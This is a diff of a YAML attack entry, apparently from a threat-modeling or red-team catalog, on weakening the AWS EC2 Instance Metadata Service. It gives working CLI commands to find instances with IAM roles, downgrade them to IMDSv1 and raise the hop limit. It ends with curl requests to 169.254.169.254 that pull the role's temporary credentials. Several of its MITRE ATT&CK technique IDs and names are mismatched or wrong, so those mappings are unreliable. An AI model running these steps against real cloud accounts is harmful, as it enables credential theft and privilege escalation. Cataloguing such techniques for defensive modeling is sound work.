@@ -1,63 +1,59 @@
 attack:
-  id: AWS-EC2-MODIFY-IMDS-OPTIONS
+  id: AWS-EC2-IMDS-WEAKENING-001
   name: EC2 Instance Metadata Service Weakening via ModifyInstanceMetadataOptions
   overview: |
-    An attacker with ec2:ModifyInstanceMetadataOptions permission can weaken Instance Metadata Service (IMDS) protections to facilitate credential exfiltration. By modifying metadata options, the attacker can force IMDSv1 (disabling token requirement), enable the metadata endpoint, or increase the HttpPutResponseHopLimit. Increasing the hop limit allows the 169.254.169.254 metadata endpoint to become reachable beyond the instance's network namespace, enabling processes and containers running on the instance or laterally accessible systems to retrieve temporary AWS credentials without direct EC2 permissions.
+    An attacker with ec2:ModifyInstanceMetadataOptions permission can weaken Instance Metadata Service (IMDS) protections on EC2 instances. By modifying metadata options, the attacker can force downgrade to IMDSv1 (disabling token requirement), increase HttpPutResponseHopLimit beyond the default, or disable the endpoint entirely. The primary risk involves raising HttpPutResponseHopLimit from 1 to 2 or higher, allowing the 169.254.169.254 metadata endpoint to become reachable outside the instance's network namespace. This enables credential exfiltration from containers, sidecars, or co-located processes that normally cannot access the instance metadata service, leading to theft of temporary AWS credentials and privilege escalation.
   steps:
     - title: Enumerate Target EC2 Instances
       command: |
         aws ec2 describe-instances \
-          --query 'Reservations[*].Instances[*].[InstanceId,State.Name,IamInstanceProfile]' \
+          --query 'Reservations[*].Instances[?IamInstanceProfile].[InstanceId,State.Name,IamInstanceProfile.Arn]' \
           --output table
       dependencies:
         - ec2:DescribeInstances
-        - Target instance must exist in AWS account
-      result: List of EC2 instance IDs and their current IAM instance profiles is obtained, identifying potential targets with elevated permissions.
-      ttp: T1526 - Gather System Network Configuration
-    - title: Check Current IMDS Configuration
+        - Target instance must exist and be in running or stopped state
+      result: |
+        Identified EC2 instances with IAM instance profiles that are potential targets. The attacker determines which instances to compromise based on their role and attached credentials.
+      ttp: T1526 - Gather System Network Configuration Discovery
+    - title: Retrieve Current Instance Metadata Options
       command: |
-        aws ec2 describe-instance-metadata-options \
+        aws ec2 describe-instances \
           --instance-ids <INSTANCE_ID> \
-          --query 'InstanceMetadataOptions'
+          --query 'Reservations[0].Instances[0].MetadataOptions' \
+          --output json
       dependencies:
-        - ec2:DescribeInstanceMetadataOptions
-        - Target instance ID
-      result: Current IMDS configuration is retrieved, showing HttpTokens requirement status, endpoint state, and HttpPutResponseHopLimit value.
-      ttp: T1518 - Software Discovery
-    - title: Weaken IMDS Protection - Disable Token Requirement
+        - ec2:DescribeInstances
+        - Target instance ID identified from previous step
+      result: |
+        Retrieved current IMDS configuration including HttpTokens status, HttpPutResponseHopLimit value, and endpoint state. This baseline shows the current security posture before modification.
+      ttp: T1526 - Gather System Network Configuration Discovery
+    - title: Weaken Instance Metadata Service Protections
       command: |
         aws ec2 modify-instance-metadata-options \
           --instance-id <INSTANCE_ID> \
           --http-tokens optional \
-          --http-endpoint enabled
-      dependencies:
-        - ec2:ModifyInstanceMetadataOptions
-        - Target instance ID
-        - Permissions to modify instance metadata options
-      result: IMDSv1 is enabled by setting HttpTokens to optional, allowing unauthenticated metadata access without token requirement.
-      ttp: T1578.4 - Modify Cloud Instance
-    - title: Increase HTTP Put Response Hop Limit
-      command: |
-        aws ec2 modify-instance-metadata-options \
-          --instance-id <INSTANCE_ID> \
+          --http-endpoint enabled \
           --http-put-response-hop-limit 2
       dependencies:
-        - ec2:ModifyInstanceMetadataOptions
+        - ec2:ModifyInstanceMetadataOptions permission
         - Target instance ID
-        - Previous metadata endpoint enablement
-      result: HttpPutResponseHopLimit is increased from 1 to 2, allowing the 169.254.169.254 endpoint to be reachable from containers, other processes, or laterally from networked systems on the instance.
-      ttp: T1578.4 - Modify Cloud Instance
-    - title: Exfiltrate Temporary Credentials from Metadata Service
+        - Instance must be running or stopped (not terminated)
+      result: |
+        Successfully modified IMDS configuration. HttpTokens set to optional (downgraded to IMDSv1), allowing unauthenticated metadata access. HttpPutResponseHopLimit increased to 2, enabling metadata endpoint access from containers and co-located processes outside the instance's network namespace.
+      ttp: T1578.001 - Modify Cloud Compute Infrastructure
+    - title: Exfiltrate Temporary Credentials via Modified IMDS
       command: |
+        curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ && \
         curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>
       dependencies:
-        - Network access to IMDS endpoint (from container or process on instance)
-        - HttpTokens set to optional
-        - HttpPutResponseHopLimit >= 2
-        - Target instance must have IAM instance profile attached
-      result: Temporary AWS credentials (AccessKeyId, SecretAccessKey, SessionToken) associated with the instance's IAM role are retrieved without authentication.
-      ttp: T1552.001 - Unsecured Credentials - Credentials in Cloud Instance Metadata
+        - Network access to 169.254.169.254 from compromised container or process
+        - HttpPutResponseHopLimit set to 2 or higher
+        - HttpTokens set to optional or HttpEndpoint enabled
+        - Instance IAM role with assumable permissions
+      result: |
+        Retrieved temporary AWS credentials (AccessKeyId, SecretAccessKey, Token, Expiration) from the instance metadata service. The attacker now possesses valid temporary credentials associated with the instance's IAM role, enabling lateral movement and privilege escalation within the AWS environment.
+      ttp: T1552.001 - Unsecured Credentials - Credentials In Files
   stride_goal:
-    - Information Disclosure
     - Elevation of Privilege
+    - Information Disclosure
     - Tampering
